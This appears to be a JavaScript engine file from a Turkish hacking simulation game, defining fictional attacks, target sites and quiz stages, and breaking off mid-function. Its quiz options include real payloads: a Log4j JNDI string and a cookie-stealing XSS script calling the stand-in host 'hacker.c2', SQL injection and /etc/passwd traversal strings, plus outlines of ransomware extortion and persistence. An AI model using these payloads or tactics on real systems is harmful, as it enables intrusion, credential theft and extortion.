const HackEngine = (function () {
  const ATTACKS = {
    'rddos': {
      id: 'rddos', name: 'RDDoS', tier: 1, multiplier: 5,
      timeCost: 30, baseSuccessRate: 70, reward: 15,
      requiredSkills: [],
      description: 'DDoS saldırısı ile fidye talep et.',
      successMsg: 'DDoS saldırısı başarılı! Hedef çöktü. Fidye notu bırakıldı:\n"Sitenin tekrar erişilebilir olmasını istiyorsan ödeme yap."',
      failMsg: 'DDoS saldırısı engellendi! CloudFlare koruması aktif.',
    },
    'db-ransom': {
      id: 'db-ransom', name: 'DB-Ransom', tier: 1, multiplier: 5,
      timeCost: 45, baseSuccessRate: 60, reward: 20,
      requiredSkills: [],
      description: 'Korumasız MongoDB/Elasticsearch bul, verileri sil, fidye bırak.',
      successMsg: 'Veritabanı ele geçirildi! Veriler silindi, fidye notu bırakıldı.',
      failMsg: 'Veritabanı korumalı. Erişim reddedildi.',
    },
    'credential-stuffing': {
      id: 'credential-stuffing', name: 'Credential Stuffing', tier: 1, multiplier: 5,
      timeCost: 40, baseSuccessRate: 55, reward: 10,
      requiredSkills: [],
      description: 'Sızdırılmış parola listesiyle admin paneline giriş dene.',
      successMsg: 'Admin paneline giriş başarılı! Site defacement uygulandı.',
      failMsg: 'Brute-force engellendi. Rate-limiting aktif.',
    },
    'sqli': {
      id: 'sqli', name: 'SQL Injection', tier: 1, multiplier: 5,
      timeCost: 35, baseSuccessRate: 65, reward: 18,
      requiredSkills: [],
      description: 'Form alanlarından SQL enjeksiyonu ile veritabanına eriş.',
      successMsg: 'SQLi başarılı! Veritabanı dump edildi.\nKVKK ihlali tehdidi ile fidye talep edildi.',
      failMsg: 'Prepared statements kullanılıyor. SQLi başarısız.',
    },
    'cve': {
      id: 'cve', name: 'CVE Exploitation', tier: 1, multiplier: 5,
      timeCost: 25, baseSuccessRate: 75, reward: 12,
      requiredSkills: [],
      description: 'Güncel olmayan CMS eklentilerindeki bilinen zafiyetleri kullan.',
      successMsg: 'CVE-2021-44228 (Log4j) exploit başarılı! Uzak kod çalıştırma sağlandı.',
      failMsg: 'Hedef güncelleme yapmış. CVE kapatılmış.',
    },
    'xss': {
      id: 'xss', name: 'XSS Hijacking', tier: 2, multiplier: 2,
      timeCost: 40, baseSuccessRate: 60, reward: 25,
      requiredSkills: [],
      description: 'JavaScript enjeksiyonu ile admin cookie çal, dosyaları kilitle.',
      successMsg: 'XSS payload çalıştı! Admin session cookie ele geçirildi.\nDosyalar şifrelendi.',
      failMsg: 'CSP (Content Security Policy) engelledi. XSS başarısız.',
    },
    'phishing': {
      id: 'phishing', name: 'Spear Phishing', tier: 2, multiplier: 2,
      timeCost: 60, baseSuccessRate: 50, reward: 30,
      requiredSkills: ['custom-phishing'],
      description: 'Sosyal mühendislik ile hedefli phishing saldırısı. Firewall bypass.',
      successMsg: 'Phishing başarılı! Backdoor yerleştirildi. Dış güvenlik duvarı aşıldı.',
      failMsg: 'Hedef şüphelendi. Phishing e-postası rapor edildi!',
    },
    'bola': {
      id: 'bola', name: 'BOLA/IDOR', tier: 2, multiplier: 2,
      timeCost: 30, baseSuccessRate: 70, reward: 22,
      requiredSkills: [],
      description: 'API URL ID değerlerini değiştirerek kullanıcı verilerini topla.',
      successMsg: 'IDOR zafiyeti bulundu! 50.000 kullanıcı verisi toplandı.',
      failMsg: 'API yetkilendirmesi doğru yapılmış. IDOR yok.',
    },
    'dir-traversal': {
      id: 'dir-traversal', name: 'Directory Traversal', tier: 2, multiplier: 2,
      timeCost: 25, baseSuccessRate: 65, reward: 20,
      requiredSkills: [],
      description: 'Dizin gezinme ile .env dosyaları ve kaynak kodları çal.',
      successMsg: 'Directory traversal başarılı!\n.env dosyası bulundu: DB_PASSWORD=admin123\nKaynak kodlar indirildi.',
      failMsg: 'Dizin erişimi engellenmiş. Traversal başarısız.',
    },
    'dependency-confusion': {
      id: 'dependency-confusion', name: 'Dependency Confusion', tier: 2, multiplier: 2,
      timeCost: 50, baseSuccessRate: 45, reward: 35,
      requiredSkills: ['payload-builder'],
      description: 'İç paket deposuna zararlı paket yükle.',
      successMsg: 'Zararlı paket yüklendi! İç sistemlere erişim sağlandı.',
      failMsg: 'Paket doğrulaması başarısız. Saldırı tespit edildi.',
    },
    'double-extortion': {
      id: 'double-extortion', name: 'Double Extortion', tier: 3, multiplier: 1,
      timeCost: 90, baseSuccessRate: 40, reward: 80,
      requiredSkills: ['c2-ransomware'],
      description: 'Verileri sızdır, ağı şifrele. "Para ver ya da verilerini karanlık ağda sızdırırım."',
      successMsg: 'Çifte şantaj başarılı!\nVeriler sızdırıldı, ağ şifrelendi.\n"Para ver ya da verilerini karanlık ağda sızdırırım."',
      failMsg: 'Yedeklerden kurtarma yapıldı. Fidye ödenmedi.',
    },
    'supply-chain': {
      id: 'supply-chain', name: 'Supply Chain', tier: 3, multiplier: 1,
      timeCost: 120, baseSuccessRate: 35, reward: 100,
      requiredSkills: ['payload-builder'],
      description: 'Tedarikçi güncellemelerini enfekte et. (SolarWinds tarzı) Sıfır gürültü.',
      successMsg: 'Supply chain saldırısı başarılı! Güncelleme sunucusu ele geçirildi.\nBinlerce sisteme erişim sağlandı. Sıfır alarm.',
      failMsg: 'İmza doğrulaması saldırıyı engelledi.',
    },
    'zero-day': {
      id: 'zero-day', name: 'Zero-Day', tier: 3, multiplier: 1,
      timeCost: 60, baseSuccessRate: 55, reward: 90,
      requiredSkills: ['zero-day-hunter'],
      description: 'Yamanmamış zafiyet. Alarm tetiklemez.',
      successMsg: 'Zero-day exploit çalıştı! Tam sistem erişimi sağlandı.\nHiçbir alarm tetiklenmedi.',
      failMsg: 'Exploit çalışmadı. Hedef mimarisi uyumsuz.',
    },
    'apt': {
      id: 'apt', name: 'APT (Advanced Persistent Threat)', tier: 3, multiplier: 1,
      timeCost: 180, baseSuccessRate: 30, reward: 150,
      requiredSkills: ['proxy-chaining', 'payload-builder'],
      description: 'Ağı sessizce haritala, yedekleri yok et, son payload çalıştır.',
      successMsg: 'APT operasyonu tamamlandı!\nAğ haritası çıkarıldı → Yedekler silindi → Payload çalıştırıldı.\nTam kontrol sağlandı.',
      failMsg: 'IDS anomali tespit etti. Bağlantı kesildi.',
    },
    'kernel-rootkit': {
      id: 'kernel-rootkit', name: 'Kernel Rootkit', tier: 3, multiplier: 1,
      timeCost: 150, baseSuccessRate: 25, reward: 200,
      requiredSkills: ['zero-day-hunter', 'payload-builder'],
      description: 'İşletim sistemi seviyeli ele geçirme. Antivirüs atlatma. Kalıcı kontrol.',
      successMsg: 'Kernel rootkit yerleştirildi!\nOS seviyesinde tam kontrol. Antivirüs atlatıldı.\nKalıcı erişim sağlandı.',
      failMsg: 'Secure Boot rootkit\'i engelledi. Kernel erişimi başarısız.',
    },
  };
  const SITE_PROFILES = {
    'hedefbank.com.tr': {
      firewall: 'High',
      vulnerabilities: ['sqli', 'credential-stuffing', 'double-extortion', 'zero-day', 'kernel-rootkit'],
      multiplier: 3.5
    },
    'megacorp.net': {
      firewall: 'Medium-High',
      vulnerabilities: ['bola', 'dir-traversal', 'supply-chain', 'dependency-confusion', 'zero-day'],
      multiplier: 2.5
    },
    'karanlikpazar.onion': {
      firewall: 'Low',
      vulnerabilities: ['rddos', 'xss', 'cve'],
      multiplier: 1.0
    },
    'globalnews.com.tr': {
      firewall: 'Low',
      vulnerabilities: ['rddos', 'xss', 'cve'],
      multiplier: 1.0
    },
    'teknoshop.com.tr': {
      firewall: 'Medium',
      vulnerabilities: ['sqli', 'credential-stuffing', 'bola', 'zero-day'],
      multiplier: 1.5
    },
    'kriptoborsa.net': {
      firewall: 'High',
      vulnerabilities: ['sqli', 'double-extortion', 'zero-day', 'apt'],
      multiplier: 3.0
    },
    'devletkapisi.gov.tr': {
      firewall: 'Ultra',
      vulnerabilities: ['zero-day', 'apt', 'kernel-rootkit'],
      multiplier: 5.0
    },
    'sirket-vpn.com': {
      firewall: 'Medium-High',
      vulnerabilities: ['cve', 'dir-traversal', 'zero-day'],
      multiplier: 2.0
    }
  };
  const QUESTIONS = {
    'rddos': [
      {
        question: '1. Aşama: DDoS saldırısı için kullanılacak botnet kontrol protokolünü seçin:',
        options: ['1) IRC/HTTP komut-kontrol kanalı', '2) SMTP e-posta sunucu protokolü', '3) FTP dosya transfer protokolü'],
        answer: 1, penalty: 5
      },
      {
        question: '2. Aşama: Hangi DDoS saldırı türü hedef sunucunun TCP el sıkışma (handshake) kaynaklarını tüketir?',
        options: ['1) UDP Flood', '2) SYN Flood (Yarım açık bağlantılar)', '3) ICMP Ping Flood'],
        answer: 2, penalty: 5
      },
      {
        question: '3. Aşama: Cloudflare/WAF korumasını aşmak için ne yapmalısınız?',
        options: ['1) Hedef sunucunun arkasındaki gerçek IP adresini (Origin IP) tespit edin', '2) VPN bağlantınızı kapatın', '3) Tarayıcı çerezlerini temizleyin'],
        answer: 1, penalty: 10
      }
    ],
    'db-ransom': [
      {
        question: '1. Aşama: MongoDB veritabanlarının varsayılan servis portu hangisidir?',
        options: ['1) Port 3306 (MySQL)', '2) Port 27017 (MongoDB)', '3) Port 5432 (PostgreSQL)'],
        answer: 2, penalty: 5
      },
      {
        question: '2. Aşama: Korumasız veritabanına bağlanıp tüm tabloları silmek ve şantaj notu bırakmak için ne yapılmalı?',
        options: ['1) Şifreyi brute-force etmeyi dene', '2) Admin yetkisiyle bağlanıp verileri dışa aktar, sil ve fidye koleksiyonu oluştur', '3) Sunucuya telnet ile bağlanıp logları izle'],
        answer: 2, penalty: 5
      },
      {
        question: '3. Aşama: İz bırakmamak için fidye ödemesinin hangi kripto para biriminde talep edilmesi en güvenlidir?',
        options: ['1) Monero (XMR) veya anonim cüzdan transferli Bitcoin (BTC)', '2) Kredi Kartı ödeme formu', '3) IBAN no ile banka havalesi'],
        answer: 1, penalty: 10
      }
    ],
    'credential-stuffing': [
      {
        question: '1. Aşama: Saldırıda kullanılacak veri listesini (combo list) nereden temin edeceksiniz?',
        options: ['1) Tamamen rastgele şifreler uydurarak', '2) Sızdırılmış veritabanı platformlarından (Pwned-DB) indirilen güncel listeler', '3) Sözlük dosyası (rockyou.txt)'],
        answer: 2, penalty: 10
      },
      {
        question: '2. Aşama: Rate-limiting ve IP engellemesini aşmak için ne kullanılmalı?',
        options: ['1) Hızlı bir internet hattı', '2) Rotasyonlu proxy listesi (Proxy Rotation)', '3) VPN\'i kapatarak doğrudan bağlantı'],
        answer: 2, penalty: 10
      },
      {
        question: '3. Aşama: Saldırı sonucu elde edilen çalışan hesaplarından hangisine odaklanılmalıdır?',
        options: ['1) Stajyer hesabı', '2) IT Yöneticisi veya Muhasebe/Finans hesabı', '3) Müşteri hizmetleri yardım masası'],
        answer: 2, penalty: 10
      }
    ],
    'sqli': [
      {
        question: '1. Aşama: SQL Injection için sızma noktası (injection point) seçin:',
        options: ['1) /api/feedback formundaki "email" parametresi (WAF filtreli)', '2) /login.php formundaki "username" parametresi (filtresiz ve doğrudan SQL sorgusuna ekleniyor)', '3) Güvenlik kodu (Captcha) alanı'],
        answer: 2, penalty: 10
      },
      {
        question: '2. Aşama: Veritabanını kandırıp oturum açma mantığını bypass edecek payload seçin:',
        options: ['1) <script>document.cookie</script>', '2) ../../../../etc/shadow', '3) \' OR \'1\'=\'1\' --'],
        answer: 3, penalty: 10
      },
      {
        question: '3. Aşama: SQL injection sonrası veritabanından veri çalmak için hangi SQL tekniğini kullanacaksınız?',
        options: ['1) UNION SELECT null, username, password FROM users --', '2) DROP TABLE users; --', '3) ALTER USER admin IDENTIFIED BY \'1234\';'],
        answer: 1, penalty: 10
      }
    ],
    'cve': [
      {
        question: '1. Aşama: Hedef sunucu üzerindeki bilinen zafiyeti (CVE) sömürmek için ilk olarak ne yapmalısınız?',
        options: ['1) Sürüm numaralarını ve yüklü eklentileri (plugins) analiz edin', '2) Sunucuya ping atın', '3) Veritabanına doğrudan bağlanmayı deneyin'],
        answer: 1, penalty: 10
      },
      {
        question: '2. Aşama: Log4j kütüphanesindeki zafiyetin türünü belirleyin (CVE-2021-44228):',
        options: ['1) Remote Code Execution - RCE (Uzaktan Kod Çalıştırma)', '2) SQL Injection', '3) Cross-Site Scripting - XSS'],
        answer: 1, penalty: 10
      },
      {
        question: '3. Aşama: Exploit kodunu hedef sunucu üzerinde tetiklemek için hangi girdiyi enjekte etmelisiniz?',
        options: ['1) ${jndi:ldap://hacker.c2/a}', '2) \' OR 1=1 --', '3) <script>alert(1)</script>'],
        answer: 1, penalty: 10
      }
    ],
    'xss': [
      {
        question: '1. Aşama: XSS türünü ve enjeksiyon noktasını seçin:',
        options: ['1) Arama kutusuna yansıyan (Reflected) parametre q', '2) Giriş yap butonunun id değeri', '3) CSS dosyası içindeki font tanımı'],
        answer: 1, penalty: 10
      },
      {
        question: '2. Aşama: Cookie çalmak için kullanılacak payload:',
        options: ['1) \' OR 1=1 --', '2) <script>fetch(\'http://hacker.c2/log?c=\' + document.cookie)</script>', '3) system("cat /etc/passwd")'],
        answer: 2, penalty: 10
      },
      {
        question: '3. Aşama: Elde edilen çerez (cookie) ile ne yapılacak?',
        options: ['1) Çerez değerini sil', '2) Tarayıcıya çerezi aktararak Admin oturumunu taklit et (Session Hijacking)', '3) Şifreyi tahmin etmeye çalış'],
        answer: 2, penalty: 10
      }
    ],
    'phishing': [
      {
        question: '1. Aşama: Sosyal mühendislik e-posta şablonunu seçin:',
        options: ['1) "Acil: Parolanız Çalındı, Hemen Sıfırlayın" (Yüksek tıklama oranı)', '2) "İyi günler dileriz" (İlgi çekmeyen sıradan mail)', '3) "Dizüstü bilgisayar satışı"'],
        answer: 1, penalty: 10
      },
      {
        question: '2. Aşama: Oltalama için kullanılacak sahte domain seçimi:',
        options: ['1) hedefbank-guvenlik-portali.net (İnandırıcı typosquatting)', '2) free-money-hacker-site.org (Şüpheli domain)', '3) hedefbank.com.tr (Gerçek domain, kullanamayız)'],
        answer: 1, penalty: 10
      },
      {
        question: '3. Aşama: Çalışandan 2FA (iki faktörlü doğrulama) kodu nasıl alınacak?',
        options: ['1) Alınamaz, sistem buna izin vermez', '2) Sahte sayfada kodu isteyip gerçek zamanlı olarak gerçek siteye ileten Reverse Proxy kullan', '3) Kurbanı telefonla ara'],
        answer: 2, penalty: 10
      }
    ],
    'bola': [
      {
        question: '1. Aşama: IDOR açığı barındıran API endpoint\'ini belirleyin:',
        options: ['1) /api/v1/auth/login', '2) /api/v1/users/profile?id=1024 (Tahmin edilebilir ID değeri)', '3) /static/css/main.css'],
        answer: 2, penalty: 10
      },
      {
        question: '2. Aşama: Yetkisiz verilere erişmek için yapılacak manipülasyon:',
        options: ['1) ID değerini artırıp azaltarak diğer kullanıcı profillerini tara', '2) Parametreye SQL tırnak işareti koy', '3) Sayfayı yenile'],
        answer: 1, penalty: 10
      },
      {
        question: '3. Aşama: Saldırı hızını ve gürültüyü sınırlamak için hangi teknik kullanılmalı?',
        options: ['1) Hiçbir şey yapma, hızlıca çek', '2) Rate limit aşımını engellemek için istekler arasına gecikme (delay) ekle', '3) Sunucuya DDoS at'],
        answer: 2, penalty: 10
      }
    ],
    'dir-traversal': [
      {
        question: '1. Aşama: Dizin gezinme açığı için sızma noktası parametresini seçin:',
        options: ['1) /index.html', '2) /view_file.php?file= (Parametrik dosya okuma)', '3) /contact-us'],
        answer: 2, penalty: 10
      },
      {
        question: '2. Aşama: Linux sunucudaki hassas konfigürasyon dosyalarını okumak için payload:',
        options: ['1) ../../../../etc/passwd veya .env', '2) \' OR 1=1', '3) <img src=x>'],
        answer: 1, penalty: 10
      },
      {
        question: '3. Aşama: Web sunucunun kök dizinine geri gitmek için hangi karakterler kullanılır?',
        options: ['1) /root/', '2) ../ (Dizin atlama karakteri)', '3) C:\\'],
        answer: 2, penalty: 10
      }
    ],
    'dependency-confusion': [
      {
        question: '1. Aşama: Dependency Confusion saldırısının temel mantığı nedir?',
        options: ['1) Sisteme virüs yüklemek', '2) İç ağda kullanılan özel (private) bir paket adını genel (public) NPM/PyPI deposunda kaydedip daha yüksek sürüm numarasıyla yayınlamak', '3) Şifre tahmin etmek'],
        answer: 2, penalty: 15
      },
      {
        question: '2. Aşama: Hedef şirketin hangi iç paket adını kullandığını nasıl öğrenirsiniz?',
        options: ['1) package.json dosyasından veya kaynak kod analizinden', '2) IP taramasıyla', '3) DDoS atarak'],
        answer: 1, penalty: 15
      },
      {
        question: '3. Aşama: Paket kurulduğunda çalışacak zararlı kodu paket yapısına nasıl eklersiniz?',
        options: ['1) package.json içindeki preinstall/postinstall betikleriyle (scripts)', '2) README dosyasına yazarak', '3) Lisans dosyasına ekleyerek'],
        answer: 1, penalty: 15
      }
    ],
    'double-extortion': [
      {
        question: '1. Aşama: Çifte Şantaj (Double Extortion) fidye yazılımı stratejisinin ilk adımı nedir?',
        options: ['1) Sistemleri hemen kilitlemek', '2) Kritik ve gizli verileri C2 sunucusuna sızdırmak (Exfiltration)', '3) Bilgisayarı kapatmak'],
        answer: 2, penalty: 15
      },
      {
        question: '2. Aşama: Verileri şifrelemek için hangi asimetrik şifreleme algoritması uygundur?',
        options: ['1) MD5', '2) AES-256 (Anahtar) + RSA-4096 (Anahtar şifreleme)', '3) Base64'],
        answer: 2, penalty: 15
      },
      {
        question: '3. Aşama: Kurbana fidye talebi nasıl iletilir?',
        options: ['1) E-posta göndererek', '2) Şifrelenen tüm dizinlere fidye notu (DECRYPT_INSTRUCTIONS.txt) bırakarak ve sızdırılan verilerin bir kısmını kanıt olarak sunarak', '3) Telefon açarak'],
        answer: 2, penalty: 15
      }
    ],
    'supply-chain': [
      {
        question: '1. Aşama: Tedarik zinciri saldırısında ilk hedef kimdir?',
        options: ['1) Asıl hedef dev şirket', '2) Asıl hedefe yazılım veya hizmet sağlayan daha küçük ve daha zayıf korunan tedarikçi/üçüncü parti firma', '3) Devlet kurumu'],
        answer: 2, penalty: 15
      },
      {
        question: '2. Aşama: Tedarikçinin güncelleme sunucusunu ele geçirdikten sonra ne yaparsınız?',
        options: ['1) Güncelleme paketini silersiniz', '2) Güncelleme paketine (update package) gizlice Truva atı (Trojan/Backdoor) ekler ve resmi imzayı manipüle edersiniz', '3) Fiyatları artırırsınız'],
        answer: 2, penalty: 15
      },
      {
        question: '3. Aşama: Bu saldırının tespit edilmesini en çok zorlaştıran unsur nedir?',
        options: ['1) Güncellemenin resmi ve güvenilir kanallar üzerinden gelmesi', '2) Sunucunun yavaş olması', '3) Şifreleme kullanılmaması'],
        answer: 1, penalty: 15
      }
    ],
    'zero-day': [
      {
        question: '1. Aşama: Hangi servis sıfırıncı gün açığı için hedeflenecek?',
        options: ['1) Apache / Nginx web sunucusunun kendisi', '2) Özel yazılmış admin panelindeki yetkilendirme bypass\'ı', '3) DNS sunucusu'],
        answer: 2, penalty: 15
      },
      {
        question: '2. Aşama: Exploit\'in IDS/IPS (saldırı tespit) sistemlerine yakalanmaması için ne yapılmalı?',
        options: ['1) Payload\'u şifrele / gizle (Obfuscation)', '2) DDoS saldırısı başlat', '3) Sunucuyu yeniden başlat'],
        answer: 1, penalty: 15
      },
      {
        question: '3. Aşama: Saldırının kalıcı olması için nereye backdoor yerleştirilmeli?',
        options: ['1) `/tmp` dizinine', '2) Sistem servisi (systemd service) veya cron job olarak', '3) Tarayıcı geçmişine'],
        answer: 2, penalty: 15
      }
    ],
    'apt': [
      {
        question: '1. Aşama: Gelişmiş Kalıcı Tehdit (APT) saldırısının ana hedefi nedir?',
        options: ['1) Hızlıca para çalıp kaçmak', '2) Hedef ağda tespit edilmeden aylarca/yıllarca kalıp veri casusluğu yapmak ve kritik altyapıyı kontrol etmek', '3) Web sitesini çökertmek'],
        answer: 2, penalty: 20
      },
      {
        question: '2. Aşama: Hedef ağda yanal hareket (Lateral Movement) yapmak için ne kullanılmalı?',
        options: ['1) Farklı ağ segmentlerindeki cihazlara sızmak için çalınan admin kimlik bilgileri (Pass-the-Hash) veya Active Directory açıkları', '2) DDoS saldırıları', '3) Wi-Fi şifre kırıcılar'],
        answer: 1, penalty: 20
      },
      {
        question: '3. Aşama: Tespit edilmeyi önlemek için komut kontrol (C2) trafiği nasıl gizlenir?',
        options: ['1) Şüpheli portları kullanarak', '2) Trafiği yasal servislerin (DNS tünelleme, HTTPS bulut servisleri) arkasına gizleyerek (Stealth C2)', '3) Hiçbir şey yapmayarak'],
        answer: 2, penalty: 20
      }
    ],
    'kernel-rootkit': [
      {
        question: '1. Aşama: Rootkit\'in işletim sisteminde yüklendiği en yetkili katman hangisidir?',
        options: ['1) User Space (Kullanıcı katmanı)', '2) Kernel Space (Çekirdek katmanı - Ring 0)', '3) Tarayıcı uzantısı'],
        answer: 2, penalty: 20
      },
      {
        question: '2. Aşama: Kernel seviyesinde rootkit yüklemek için hangi koruma mekanizmasının bypass edilmesi gerekir?',
        options: ['1) Windows Secure Boot / Driver Signature Enforcement (Sürücü İmza Zorunluluğu)', '2) Windows Defender', '3) Güvenlik duvarı'],
        answer: 1, penalty: 20
      },
      {
        question: '3. Aşama: Rootkit kurulduktan sonra kendini antivirüslere karşı nasıl gizler?',
        options: ['1) Antivirüsü silerek', '2) Sistem çağrılarını (syscalls) manipüle edip kendi dosya ve işlemlerini işletim sisteminin kendisinden bile saklayarak', '3) Bilgisayarı yavaşlatarak'],
        answer: 2, penalty: 20
      }
    ]
  };
  let _activeSession = null;
  function isInteractiveActive() {
    return (typeof HackPhases !== 'undefined' && HackPhases.isActive()) || _activeSession !== null;
  }
  function getGameMinutes() {
    const day = GameState.get('day');
    const time = GameState.get('time');
    return day * 1440 + time.hours * 60 + time.minutes;
  }
  function executeAttack(attackType, target) {
    const attack = ATTACKS[attackType];
    if (!attack) {
      TerminalApp.printOutput('[!] Bilinmeyen saldırı türü: ' + attackType, 'cmd-error');
      TerminalApp.printOutput('    "help" yazarak mevcut türleri görebilirsiniz.', 'cmd-output');
      return;
    }
    const site = Object.keys(BrowserApp.SITE_REGISTRY).find(d => target && target.includes(d));
    if (!site) {
      TerminalApp.printOutput('[!] Geçersiz hedef: ' + (target || 'belirtilmedi'), 'cmd-error');
      TerminalApp.printOutput('    "targets" yazarak hedef listesini görebilirsiniz.', 'cmd-output');
      return;
    }
    const scanned = GameState.get('scannedTargets') || {};
    if (!scanned[site]) {
      TerminalApp.printOutput('[!] Hedef taranmamış. Önce "scan ' + site + '" komutunu çalıştırın.', 'cmd-error');
      return;
    }
    const profile = SITE_PROFILES[site];
    if (profile && !profile.vulnerabilities.includes(attackType)) {
      simulateFailedIncompatible(attack, site);
      return;
    }
    const siteStates = GameState.get('siteStates') || {};
    const state = siteStates[site] || {};
    const currentMins = getGameMinutes();
    if (state.lockdownUntil && currentMins < state.lockdownUntil) {
      const remainingMin = state.lockdownUntil - currentMins;
      TerminalApp.printOutput('[!] HEDEF KİLİTLENDİ (Lockdown)! Şüpheli sızma girişimleri nedeniyle site korumaya alındı.', 'cmd-error');
      TerminalApp.printOutput('    Kilit açılmasına kalan süre: ' + remainingMin + ' dakika.', 'cmd-error');
      return;
    }
    if (state.cooldownUntil && currentMins < state.cooldownUntil) {
      const remainingMin = state.cooldownUntil - currentMins;
      TerminalApp.printOutput('[!] HEDEF YAMALANDI (Cooldown)! Siteye en son saldırıdan sonra güvenlik yamaları uygulandı.', 'cmd-error');
      TerminalApp.printOutput('    Yamanın esnemesi için kalan süre: ' + remainingMin + ' dakika.', 'cmd-error');
      return;
    }
    const missingSkills = attack.requiredSkills.filter(s => !GameState.hasSkill(s));
    if (missingSkills.length > 0) {
      TerminalApp.printOutput('[!] Bu saldırı için gerekli yetenekler eksik:', 'cmd-error');
      missingSkills.forEach(function (s) {
        TerminalApp.printOutput('    ✗ ' + s, 'cmd-error');
      });
      TerminalApp.printOutput('    Yetenek ağacını kontrol edin.', 'cmd-output');
      return;
    }
    startInteractiveExploit(attackType, target, site);
  }
  function startInteractiveExploit(attackType, target, site) {
    const attack = ATTACKS[attackType];
    _activeSession = {
      attackType: attackType,
      target: target,
      site: site,
    };
    TerminalApp.printOutput('', '');
    TerminalApp.printOutput('╔════════════════════════════════════════════════╗', 'cmd-warning');
    TerminalApp.printOutput('║  ⚡ SIZMA BAŞLATILIYOR: ' + attack.name.padEnd(24) + '║', 'cmd-warning');
    TerminalApp.printOutput('╠════════════════════════════════════════════════╣', 'cmd-warning');
    TerminalApp.printOutput('║  Hedef : ' + site.padEnd(37) + '║', 'cmd-warning');
    TerminalApp.printOutput('║  Tier  : ' + ('Tier ' + attack.tier + ' — ' + (attack.tier === 1 ? 'Başlangıç' : attack.tier === 2 ? 'Orta' : 'İleri')).padEnd(37) + '║', 'cmd-warning');
    TerminalApp.printOutput('╚════════════════════════════════════════════════╝', 'cmd-warning');
    TerminalApp.printOutput('', '');
    HackPhases.startPhases(attackType, target, site, function (phaseResult) {
      finishInteractiveExploit(phaseResult);
    });
  }
  function handleInteractiveInput(input) {
    if (typeof HackPhases !== 'undefined' && HackPhases.isActive()) {
      HackPhases.handleInput(input);
      return;
    }
  }
  function finishInteractiveExploit(phaseResult) {
    const session = _activeSession;
    _activeSession = null;
    $('#terminal-input').attr('placeholder', 'komut girin...');
    const attack = ATTACKS[session.attackType];
    const site = session.site;
    phaseResult = phaseResult || { rewardBonus: 0, suspicionBonus: 0 };
    let interactiveModifier = phaseResult.rewardBonus || 0;
    let successRate = attack.baseSuccessRate + interactiveModifier;
    if (GameState.hasSkill('topology')) successRate += 5;
    if (GameState.hasSkill('pwned-db') && attack.id === 'credential-stuffing') successRate += 20;
    if (GameState.hasSkill('proxy-chaining')) successRate += 5;
    if (GameState.hasSkill('payload-builder') && attack.tier === 3) successRate += 10;
    if (GameState.get('location') === 'cafe') successRate += 5;
    successRate = Math.min(95, Math.max(5, successRate));
    const success = Math.random() * 100 < successRate;
    TimeSystem.advanceTime(attack.timeCost);
    TerminalApp.printOutput('▸ Bağlantı sonlandırılıyor...', 'cmd-output');
    TerminalApp.printOutput('▸ Analiz raporu derleniyor...', 'cmd-output');
    setTimeout(function () {
      TerminalApp.printOutput('', '');
      const profile = SITE_PROFILES[site] || { multiplier: 1.0 };
      const choiceBonus = phaseResult.rewardBonus > 0 ? Math.round(phaseResult.rewardBonus * profile.multiplier * 0.3) : 0;
      const finalReward = Math.round(attack.reward * profile.multiplier) + choiceBonus;
      if (success) {
        TerminalApp.printOutput('[✓] SALDIRI BAŞARILI!', 'cmd-success');
        TerminalApp.printOutput('', '');
        attack.successMsg.split('\n').forEach(function (line) {
          TerminalApp.printOutput('  ' + line, 'cmd-success');
        });
        TerminalApp.printOutput('', '');
        TerminalApp.printOutput('  💰 Kazanç: ₿' + finalReward + ' (Site Çarpanı: x' + profile.multiplier + ')', 'cmd-info');
        TerminalApp.printOutput('  ⏱️  Süre: ' + attack.timeCost + ' dakika', 'cmd-output');
        GameState.addMoney(finalReward);
        const sp = attack.tier;
        GameState.addSkillPoints(sp);
        TerminalApp.printOutput('  ⭐ Yetenek Puanı: +' + sp, 'cmd-info');
        const siteStates = GameState.get('siteStates') || {};
        if (!siteStates[site]) siteStates[site] = { failedAttempts: 0 };
        const cooldownMinutes = 1440 * attack.tier; 
        siteStates[site].cooldownUntil = getGameMinutes() + cooldownMinutes;
        siteStates[site].failedAttempts = 0;
        GameState.set('siteStates', siteStates);
        const history = GameState.get('hackHistory');
        if (history.length === 0 && !GameState.get('firstHackDone')) {
          GameState.set('firstHackDone', true);
          setTimeout(function () {
            MessengerApp.triggerStoryEvent('brokerFirstContact');
          }, 2000);
        }
        $(document).trigger('game:hackSuccess', {
          attackType: attack.id,
          target: site,
          reward: finalReward,
        });
      } else {
        TerminalApp.printOutput('[✗] SALDIRI BAŞARISIZ!', 'cmd-error');
        TerminalApp.printOutput('', '');
        attack.failMsg.split('\n').forEach(function (line) {
          TerminalApp.printOutput('  ' + line, 'cmd-error');
        });
        const siteStates = GameState.get('siteStates') || {};
        if (!siteStates[site]) siteStates[site] = { failedAttempts: 0 };
        siteStates[site].failedAttempts++;
        if (siteStates[site].failedAttempts >= 3) {
          siteStates[site].lockdownUntil = getGameMinutes() + 2880; 
          siteStates[site].failedAttempts = 0;
          TerminalApp.printOutput('', '');
          TerminalApp.printOutput('  🚨 GÜVENLİK TEHDİDİ SİSTEM ALARMI! 3 başarısız deneme sonucu site 48 saatliğine LOCKDOWN durumuna alındı!', 'cmd-error');
        } else {
          TerminalApp.printOutput('  ⚠️ Başarısız deneme: ' + siteStates[site].failedAttempts + ' / 3 (3 olunca site kilitlenir)', 'cmd-warning');
        }
        GameState.set('siteStates', siteStates);
      }
      let vpnPenaltyMultiplier = 1.0;
      if (GameState.get('location') === 'cafe' && !GameState.get('vpnActive')) {
        if (GameState.get('vpnUnlocked')) {
          vpnPenaltyMultiplier = 1.8;
          TerminalApp.printOutput('  ⚠️ VPN KAPALI! Kafede hack yapmak +%80 şüphe cezası uyguladı!', 'cmd-error');
        }
      }
      const suspicionGain = SuspicionSystem.addSuspicionFromHack(attack.multiplier * vpnPenaltyMultiplier);
      TerminalApp.printOutput('  🔍 Şüphe: +' + suspicionGain + '% (toplam: ' + GameState.get('suspicion') + '%)', 'cmd-warning');
      if (phaseResult.suspicionBonus > 0) {
        GameState.addSuspicion(phaseResult.suspicionBonus);
        TerminalApp.printOutput('  ⚠️ Seçim cezası: +' + phaseResult.suspicionBonus + '% ek şüphe (risk seçimi)', 'cmd-warning');
      }
      if (GameState.get('location') === 'cafe' && !GameState.get('firstCafeHackDone')) {
        GameState.set('firstCafeHackDone', true);
        GameState.set('vpnUnlocked', true);
        $('#tray-vpn').addClass('unlocked');
        setTimeout(function () {
          MessengerApp.triggerStoryEvent('paranoyakVpnWarning');
        }, 1500);
      }
      const hackHistory = GameState.get('hackHistory');
      hackHistory.push({
        type: attack.id,
        name: attack.name,
        target: site,
